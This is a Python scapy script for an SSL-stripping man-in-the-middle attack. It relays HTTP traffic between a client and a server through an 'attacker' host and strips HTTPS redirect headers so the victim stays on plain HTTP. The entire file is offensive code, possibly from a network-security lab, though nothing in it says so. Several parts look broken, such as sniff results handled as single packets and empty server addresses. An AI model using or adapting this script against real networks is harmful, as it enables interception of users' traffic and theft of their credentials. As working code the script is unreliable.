import scapy.all as sc

serverMac = ""
serverIP = ""

clientIP = ""
clientMac = ""

attackerIP = sc.conf.route.route("0.0.0.0")[1]
attackerMac = sc.get_if_hwaddr(sc.conf.iface)

sc.load_layer("http")

def handle_packet(pkt):
    global clientIP, clientMac
    print(f"HTTP request from client: {pkt.summary()}")
    clientIP = pkt[sc.IP].src
    clientMac = pkt[sc.Ether].src

    if pkt.haslayer(sc.IP) and pkt.haslayer(sc.TCP) and pkt.haslayer(sc.Raw):
        ether = sc.Ether(src=attackerMac, dst=serverMac)
        ip = sc.IP(src=attackerIP, dst=serverIP)
        tcp = sc.TCP(
            sport=pkt[sc.TCP].sport,
            dport=pkt[sc.TCP].dport,
            seq=pkt[sc.TCP].seq,
            ack=pkt[sc.TCP].ack,
            flags=pkt[sc.TCP].flags
        )
        raw = sc.Raw(load=pkt[sc.Raw].load)
        forward_pkt = ether / ip / tcp / raw
        sc.sendp(forward_pkt, iface=sc.conf.iface, verbose=False)
        pkt = sc.sniff(filter=f"tcp and src host {serverIP} and dst port 80", store=False)
        if (is_rst(pkt)):
            return
        else:
            resp_ssl_strip(pkt)
        ack = sc.sniff(lfilter=is_server_ack, count=1, timeout=5)
        print(f"HTTP ACK from server: {ack.summary()}")
        while (True):
            nxt_pkt = sc.sniff(filter="http")
            if (nxt_pkt[sc.IP].src == clientIP):
                forward_to_server(nxt_pkt)
                if (is_rst(nxt_pkt) or is_tcp_fin(nxt_pkt)):
                    return
            if (nxt_pkt[sc.IP].src == serverIP):
                forward_to_client(nxt_pkt)
                if (is_rst(nxt_pkt) or is_tcp_fin(nxt_pkt)):
                    return
            

        


def filter_get_requests(pkt):
    return (
        pkt.haslayer(sc.HTTPRequest) and
        pkt[sc.HTTPRequest].Method == b'GET' and
        sc.IP in pkt and pkt[sc.IP].dst == attackerIP
    )

def filter_response(pkt):
    return (
        pkt.haslayer(sc.Raw) and
        b"HTTP/1.1 30" in pkt[sc.Raw].load and
        b"Location: https://" in pkt[sc.Raw].load
    )

def is_rst(pkt):
    return sc.TCP in pkt and 'R' in pkt[sc.TCP].flags

def is_tcp_fin(pkt):
    return sc.TCP in pkt and 'F' in pkt[sc.TCP].flags

def resp_ssl_strip(pkt):
    print(f"Packet from server to client: {pkt.summary()}")

    if (is_rst(pkt)):
        forward_to_client(pkt)

    if not filter_response(pkt):
        return False

    data = pkt[sc.Raw].load
    lines = data.split(b"\r\n")
    stripped_lines = [line for line in lines if not line.startswith(b"Location: https://")]
    new_load = b"\r\n".join(stripped_lines)

    ether = sc.Ether(src=attackerMac, dst=clientMac)
    ip = sc.IP(src=attackerIP, dst=clientIP)
    tcp = sc.TCP(
        sport=pkt[sc.TCP].sport,
        dport=pkt[sc.TCP].dport,
        seq=pkt[sc.TCP].seq,
        ack=pkt[sc.TCP].ack,
        flags=pkt[sc.TCP].flags
    )
    raw = new_load
    new_pkt = ether / ip / tcp / raw
    sc.sendp(new_pkt, iface=sc.conf.iface, verbose=False)

    ack_pkt = sc.IP(src=attackerIP, dst=serverIP) / sc.TCP(
        sport=pkt[sc.TCP].dport,
        dport=pkt[sc.TCP].sport,
        seq=pkt[sc.TCP].ack,
        ack=pkt[sc.TCP].seq + len(pkt[sc.Raw].load),
        flags="A"
    )
    sc.send(ack_pkt, verbose=False)
    return True

def is_server_ack(pkt):
    return (
        pkt.haslayer(sc.TCP)
        and pkt[sc.IP].src == serverIP
        and pkt[sc.IP].dst == attackerIP
        and pkt[sc.TCP].flags == "A" 
    )

def forward_to_client(pkt):
    ether = sc.Ether(src=attackerMac, dst=clientMac)
    ip = sc.IP(src=attackerIP, dst=clientIP)
    tcp = sc.TCP(
        sport=pkt[sc.TCP].sport,
        dport=pkt[sc.TCP].dport,
        seq=pkt[sc.TCP].seq,
        ack=pkt[sc.TCP].ack,
        flags=pkt[sc.TCP].flags
    )
    raw = sc.Raw(load=pkt[sc.Raw].load)
    new_pkt = ether / ip / tcp / raw
    sc.sendp(new_pkt, iface=sc.conf.iface, verbose=False)


def forward_to_server(pkt):
    ether = sc.Ether(src=attackerMac, dst=serverMac)
    ip = sc.IP(src=attackerIP, dst=serverIP)
    tcp = sc.TCP(
        sport=pkt[sc.TCP].sport,
        dport=pkt[sc.TCP].dport,
        seq=pkt[sc.TCP].seq,
        ack=pkt[sc.TCP].ack,
        flags=pkt[sc.TCP].flags
    )
    raw = sc.Raw(load=pkt[sc.Raw].load)
    new_pkt = ether / ip / tcp / raw
    sc.sendp(new_pkt, iface=sc.conf.iface, verbose=False)


while True:
    sc.sniff(filter="tcp port 80", prn=handle_packet, lfilter=filter_get_requests, store=False)